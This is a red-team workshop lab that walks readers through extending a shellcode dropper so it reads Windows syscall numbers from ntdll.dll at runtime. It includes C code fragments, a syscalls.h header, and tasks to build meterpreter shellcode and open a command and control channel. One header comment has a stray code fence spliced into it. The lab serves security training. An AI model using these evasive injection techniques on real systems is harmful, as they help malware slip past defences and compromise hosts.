## LAB Exercise 6: Dynamic Retrieval from SSNs

In the first bonus chapter we want to further develop our indirect syscall dropper. Until now, we had the limitation that our dropper would only work in the context of the Windows version that was used to debug the system service numbers (SSNs) for the used native functions ``NtAllocateVirtualMemory``, ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``. Why? Because to get the basics for direct and indirect syscalls, we have implemented the SSNs as hardcoded values in our assembly resource file. But normally, when we are preparing for a red team engagement, we do not know the Windows version of our target client. So we want to make our indirect syscall dropper a bit more flexible and instead of hardcoding the SSNs, we want to retrieve them dynamically at runtime from ntdll.dll. 
  

## Exercise 6 Tasks: 
### Develop your direct or indirect syscall dropper to dynamically retrieve SSNs.
| Task Nr.   | Task Description |
| :---:      | ---              |
|  1         | Download the direct or indirect syscall POC from the code section of this chapter.                 |
|  2         | Most of the code is already implemented. However, to implement the dynamic SSN retrieval functionality, you will need to complete the following tasks: <ul><li>Complete the missing code in the main code section</li><li>Complete the missing code in the ``syscalls.asm`` file</li></ul>                  |
|  3          | Create a staged x64 meterpreter shellcode with msfvenom, copy it to the poc and compile the poc.                 |
|  4          | Create and run a staged x64 meterpreter listener using msfconsole.                  |
| 5           | un your compiled .exe and check that a stable command and control channel opens.                 |


### Analyse the Dropper
| Task Nr.   | Task Description |
| :---:      | ---              |
| 6          | Use **x64dbg** to debug or analyse the dropper. <ul><li>What differences can you see between a dropper with hardcoded SSNs and a dropper that dynamically retrieves SSNs at runtime?</li></ul>                |

## Visual Studio
You can download the direct- or indirect syscall poc from the code section of this chapter. To retrieve the SSNs dynamicalla at runtime from ntdll.dll, we have to implement the following code. 

### Start Address Native Function
In order to be able to dynamically retrieve the SSN for each of the native functions used in our code, we first need to define a pointer to a function that holds the start address of that function. If you remember, this part of the code was already implemented in the chapter where we built the indirect syscall dropper, because we used the same principle to get the address for the syscall instruction of each function. This means that part of the code in the main file is already implemented.  
<details>
<summary>Code</summary>
    
```C
// Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");     
```
     
</details>

### Memory Address System Service Number (SSN)
In the next step, we want to get the effective memory address from the ``SSN`` in the ``syscall stub`` of the native function by adding the necessary offset to the start address of the native function that we retrieved in the previous step. To get the memory address from the syscall instruction, we need to add ``4-bytes``. Why 4-bytes? Because this is the offset calculated from the start address of the native function.

<details>
    <p align="center">
<img width="1000" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/1b6bd7f1-1323-48d1-bcb2-83d4395c49bb"> 
    </p>
</details>   


In the direct- or indirect syscall poc in this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.  
<details>
<summary>Code</summary>
    
```C
// Here we're retrieving the system call number for each function. The syscall number is used to identify the syscall when the program uses the syscall instruction.
    // It's assumed that the syscall number is located 4 bytes into the function.
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];     
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 

<details>
<summary>Solution</summary>
    
```C
// Here we're retrieving the system call number for each function. The syscall number is used to identify the syscall when the program uses the syscall instruction.
    // It's assumed that the syscall number is located 4 bytes into the function.
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];    
```
     
</details>

### Global Variables
To store the memory address from the SSN of the respective native function, and also to be able to provide the memory address later for the assembly code in the ``syscalls.asm`` file, we declare a global variable for each SSN address, which is declared as a DWORD. Also in this case in the direct- or indirect syscall poc of this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.

<details>
<summary>Code</summary>
    
```C
// Global DWORD (double words) that will hold the SSN
DWORD wNtAllocateVirtualMemory;       
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 

<details>
<summary>Solution</summary>
    
```C
// Declare global variables to hold the syscall instruction addresses
DWORD wNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
DWORD wNtCreateThreadEx;
DWORD wNtWaitForSingleObject;     
```
     
</details>



### Header File
Like the direct- and indirect syscall dropper with hardcodes SSNs, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. This taks is redundant if you have already implemented the ``syscalls.h`` in your direct- or indirect syscall dropper from before (hardcoded SSNs).

<details>
<summary>Code</summary>

```C
#ifndef _SYSCALLS_H  // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion.
#define _SYSCALLS_H  // Define _SYSCALLS_H

#include <windows.h>  // Include the Windows API header

#ifdef __cplusplus   // If this header file is included in a C++ file, then this section will be true
extern "C" {         // This is to ensure that the names of the functions are not mangled by the C++ compiler and are in C linkage format
#endif

    // The type NTSTATUS is typically defined in the Windows headers as a long.
    typedef long NTSTATUS;  // Define NTSTATUS as a long
    typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

    // Declare the function prototype for NtAllocateVirtualMemory
    extern NTSTATUS NtAllocateVirtualMemory(
        HANDLE ProcessHandle,    // Handle to the process in which to allocate the memory
        PVOID* BaseAddress,      // Pointer to the base address
        ULONG_PTR ZeroBits,      // Number of high-order address bits that must be zero in the base address of the section view
        PSIZE_T RegionSize,      // Pointer to the size of the region
        ULONG AllocationType,    // Type of allocation
        ULONG Protect            // Memory protection for the region of pages
    );

    // Declare the function prototype for NtWriteVirtualMemory
    extern NTSTATUS NtWriteVirtualMemory(
        HANDLE ProcessHandle,     // Handle to the process in which to write the memory
        PVOID BaseAddress,        // Pointer to the base address
        PVOID Buffer,             // Buffer containing data to be written
        SIZE_T NumberOfBytesToWrite, // Number of bytes to be written
        PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
    );

    // Declare the function prototype for NtCreateThreadEx
    extern NTSTATUS NtCreateThreadEx(
        PHANDLE ThreadHandle,        // Pointer to a variable that receives a handle to the new thread
        ACCESS_MASK DesiredAccess,   // Desired access to the thread
        PVOID ObjectAttributes,      // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes
        HANDLE ProcessHandle,        // Handle to the process in which the thread is to be created
        PVOID lpStartAddress,        // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread
        PVOID lpParameter,           // Pointer to a variable to be passed to the thread
        ULONG Flags,                 // Flags that control the creation of the thread
        SIZE_T StackZeroBits,        // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer
        SIZE_T SizeOfStackCommit,    // The size of the stack that must be committed at thread creation
        SIZE_T SizeOfStackReserve,   // The size of the stack that must be reserved at thread creation
        PVOID lpBytesBuffer          // Pointer to a variable that receives any output data from the system
    );

    // Declare the function prototype for NtWaitForSingleObject
    extern NTSTATUS NtWaitForSingleObject(
        HANDLE Handle,          // Handle to the object to be waited on
        BOOLEAN Alertable,      // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread
        PLARGE_INTEGER Timeout  // Pointer to a LARGE_INTEGER that specifies the absolute```c
        // or relative time at which the function should return, regardless of the state of the object
    );

#ifdef __cplusplus  // End of the 'extern "C"' block if __cplusplus was defined
}
#endif

#endif // _SYSCALLS_H  // End of the _SYSCALLS_H definition
  
```
    
</details>
    
<details>
<summary>Results</summary>   
    <p align="center">
<img width="500" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/5fbb39c6-be30-4641-8652-6b98e478e17f"> 
    </p>
    <p align="center">   
    <img width="800" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/d116e34d-8bea-4d4b-a437-a27594218a5b">
    </p>
    <p align="center">
    <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/4b3e7f58-b6c1-492a-9516-46dcf3af942c">
    </p>
</details>  
